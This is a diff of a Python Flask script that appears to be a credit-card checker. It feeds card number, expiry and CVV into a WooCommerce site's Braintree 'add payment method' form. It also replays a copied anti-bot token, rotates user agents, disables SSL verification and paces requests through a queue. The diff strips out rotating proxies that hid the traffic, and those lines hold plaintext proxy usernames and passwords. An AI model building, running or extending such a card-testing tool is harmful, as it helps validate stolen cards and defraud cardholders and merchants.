@@ -7,13 +7,9 @@ from bs4 import BeautifulSoup
 import json as json_module
 import time
 from urllib.parse import urlparse
-import urllib3
 import threading
 import queue
 from datetime import datetime
-
-# Disable SSL warnings
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 app = Flask(__name__)
 
@@ -22,16 +18,6 @@ request_queue = queue.Queue()
 processing_thread = None
 last_process_time = 0
 PROCESSING_INTERVAL = 20  # 20 seconds between requests
-
-# List of proxies to rotate - properly formatted
-proxies_list = [
-    {'http': 'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@sg-sin.pvdata.host:8080', 
-     'https': 'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@sg-sin.pvdata.host:8080'},
-    {'http': 'http://brad:bradhqcc@tits.oops.wtf:6969', 
-     'https': 'http://brad:bradhqcc@tits.oops.wtf:6969'},
-    {'http': 'http://sssssss:sssssssssssssssssssssss@tits.oops.wtf:6969', 
-     'https': 'http://sssssss:sssssssssssssssssssssss@tits.oops.wtf:6969'}
-]
 
 # User agents list
 uaa = [
@@ -75,61 +61,32 @@ session = requests.Session()
 session.verify = False  # Disable SSL verification for the session
 
 def requests_with_retry(method, url, max_retries=2, **kwargs):
-    """Makes a request with proxy rotation and retries."""
+    """Makes a request with retries."""
     last_error = None
-    # Shuffle proxies to try a different one first each time
-    shuffled_proxies = random.sample(proxies_list, len(proxies_list))
     
     for attempt in range(max_retries):
-        proxy = shuffled_proxies[attempt % len(shuffled_proxies)]
         try:
-            # Make sure we're using the right proxy protocol for the URL
-            parsed_url = urlparse(url)
-            if parsed_url.scheme == 'https':
-                # For HTTPS URLs, use the HTTPS proxy if available, otherwise fall back to HTTP proxy
-                if 'https' in proxy and proxy['https']:
-                    actual_proxy = proxy
-                else:
-                    actual_proxy = {'http': proxy.get('http', ''), 'https': proxy.get('http', '')}
-            else:
-                actual_proxy = proxy
-                
             response = session.request(
                 method, 
                 url, 
-                proxies=actual_proxy, 
                 timeout=8,  # Reduced timeout for faster processing
                 **kwargs
             )
             response.raise_for_status()  # Raise an exception for bad status codes (4xx or 5xx)
             return response
-        except (requests.exceptions.ProxyError, 
-                requests.exceptions.ConnectTimeout, 
+        except (requests.exceptions.ConnectTimeout, 
                 requests.exceptions.ConnectionError,
                 requests.exceptions.ReadTimeout,
                 requests.exceptions.HTTPError,
                 requests.exceptions.SSLError) as e:
             last_error = e
-            print(f"Attempt {attempt + 1} failed with proxy {proxy}: {e}. Retrying...")
+            print(f"Attempt {attempt + 1} failed: {e}. Retrying...")
             # Reduced delay between retries
             time.sleep(0.5)
             continue
             
-    # If all retries fail, try without proxy as a last resort
-    try:
-        print("All proxies failed, trying without proxy...")
-        response = session.request(
-            method, 
-            url, 
-            timeout=8,  # Reduced timeout
-            **kwargs
-        )
-        response.raise_for_status()
-        return response
-    except Exception as e:
-        print(f"Request without proxy also failed: {e}")
-        # If all attempts fail, raise the last error
-        raise last_error
+    # If all retries fail, raise the last error
+    raise last_error
 
 def process_payment(cc, mm, yy, cvv):
     try:
@@ -254,7 +211,7 @@ def process_payment(cc, mm, yy, cvv):
             '_wp_http_referer': '/my-account/add-payment-method',
             'woocommerce_add_payment_method': '1',
             'apbct__email_id__elementor_form': '',
-            'apbct_visible_fields': 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiIiwidmlzaWJsZV9maWVsZHNfY291bnQiOjAsImludmlzaWJsZV9maWVsZHMiOiJicmFpbnRyZWVfY2Nfbm9uY2Vfa2V5IGJyYWludHJlZV9jY19kZXZpY2VfZGF0YSBicmFpbnRyZWVfY2NfM2RzX25vbmNlX2tleSBicmFpbnRyZWVfY2NfY29uZmlnX2RhdGEgd29vY29tbWVyY2UtYWRkLXBheW1lbnQtbWV0aG9kLW5vbmNlIF93cF9odHRwX3JlZmVyZXIgd29vY29tbWVyY2VfYWRkX3BheW1lbnRfbWV0aG9kIGFwYmN0X19lbWFpbF9pZF9fZWxlbWVudG9yX2Zvcm0iLCJpbnZpc2libGVfZmllbGRzX2NvdW50Ijo4fX0=',
+            'apbct_visible_fields': 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiIiwidmlzaWJsZV9maWVsZHMiOiIiLCJpbnZpc2libGVfZmllbGRzIjoiYnJhaW50cmVlX2NjX25vbmNlX2tleSBicmFpbnRyZWVfY2NfZGV2aWNlX2RhdGEgYnJhaW50cmVlX2NjXzNkc19ub25jZV9rZXkgYnJhaW50cmVlX2NjX2NvbmZpZ19kYXRhIHdvb2NvbW1lcmNlLWFkZC1wYXltZW50LW1ldGhvZC1ub25jZSBfd3BfaHR0cF9yZWZlcmVyIHdvb2NvbW1lcmNlX2FkZF9wYXltZW50X21ldGhvZCBhcGJjdF9fZW1haWxfaWRfX2VsZW1lbnRvcl9mb3JtIiwiaW52aXNpYmxlX2ZpZWxkc19jb3VudCI6OH19',
             'ct_bot_detector_event_token': '39d6ad2a7c6cebe4685f4bd5835a64c4db0d6b262761335b7bbed0dfb690384c',
         }
 
@@ -288,7 +245,7 @@ def process_payment(cc, mm, yy, cvv):
     except Exception as e:
         return {
             'status': 'Error',
-            'response': f'All proxies failed or an unexpected error occurred. Last error: {str(e)}'
+            'response': f'An unexpected error occurred: {str(e)}'
         }
 
 def queue_worker():
